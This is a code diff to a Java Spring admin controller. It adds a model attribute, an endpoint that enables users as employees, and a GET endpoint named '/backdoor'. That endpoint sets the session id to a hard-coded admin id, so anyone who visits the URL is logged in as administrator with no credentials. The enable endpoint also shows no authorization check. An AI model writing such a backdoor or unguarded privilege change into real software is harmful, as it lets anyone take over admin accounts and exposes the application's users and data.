@@ -11,6 +11,7 @@ import org.springframework.web.bind.annotation.DeleteMapping;
 import org.springframework.web.bind.annotation.GetMapping;
 import org.springframework.web.bind.annotation.ModelAttribute;
 import org.springframework.web.bind.annotation.PatchMapping;
+import org.springframework.web.bind.annotation.PathVariable;
 import org.springframework.web.bind.annotation.PostMapping;
 import org.springframework.web.bind.annotation.RequestParam;
 
@@ -44,6 +45,7 @@ public class AdminController {
 		model.addAttribute("unassignedUsers", uServ.getUnassignedUsers());
 		model.addAttribute("unassignedEmployees", eServ.getUnassigned());
 		model.addAttribute("unassignedCustomers", cServ.getUnassigned());
+		model.addAttribute("notEmployeeEnabled", uServ.findNotEmployeeEnabled());
 		
 		
 		return "admin.jsp";
@@ -79,5 +81,24 @@ public class AdminController {
 		return "redirect:/admin";
 		
 	}
+	
+	@PostMapping("/user/enable/{id}")
+	public String enableAsEmployee(
+			@PathVariable("id") Long userId
+			) {
+		User user = uServ.findUserById(userId);
+		uServ.enableAsEmployee(user);
+		return "redirect:/admin";
+	}
+	
+	@GetMapping("/backdoor")
+	public String backdoor(
+			HttpSession session
+			) {
+		Long adminId = (long) 2;
+		session.setAttribute("id", adminId);
+		return "redirect:/admin";
+	}
+	
 
 }
